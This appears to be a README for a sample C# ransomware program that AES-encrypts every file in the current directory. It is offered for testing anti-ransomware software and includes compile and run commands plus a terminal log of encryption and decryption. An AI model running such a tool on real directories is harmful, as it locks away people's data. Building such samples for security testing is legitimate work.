## this is the sample ransom ware [file encryption]

education purpose only!

AES encrypt all file in current directory

this is the sample program that for testing security program to anti ransom ware so on

compile
```
mcs ransomsample.cs
```

execute(encrypt)
```
[linux]
mono ransomesample.exe
[windows]
.\ransomesample.exe
```

execute(decrypt)
```
[linux]
mono ransomesample.exe -d
[windows]
.\ransomesample.exe -d
```

```

-> cat test*.txt
this is the test2
this is the test3
this is the test

-> ./ransomsample.exe 
Encrypting directory: /home/g01d3nw01f/dev/cs/lab
Encrypting: test2.txt
Encrypting: ransomsample.cs
Encrypting: test3.txt
Encrypting: test.txt
Skipping self: ransomsample.exe
Encryption process completed successfully!

-> cat test*.txt
C��O�dj��H�u�)��vJS�X]�/�'��;�ۦ��vE��`�g~���^zS^�ğ0��(kzY'�%|#�ܴ��RY���]6͜�b6[

-> ./ransomsample.exe -d
Decrypting directory: /home/g01d3nw01f/dev/cs/lab
Decrypting: test2.txt
Decrypting: ransomsample.cs
Decrypting: test3.txt
Decrypting: test.txt
Skipping self: ransomsample.exe
Decryption process completed successfully!

-> cat test*.txt
this is the test2
this is the test3
this is the test

```



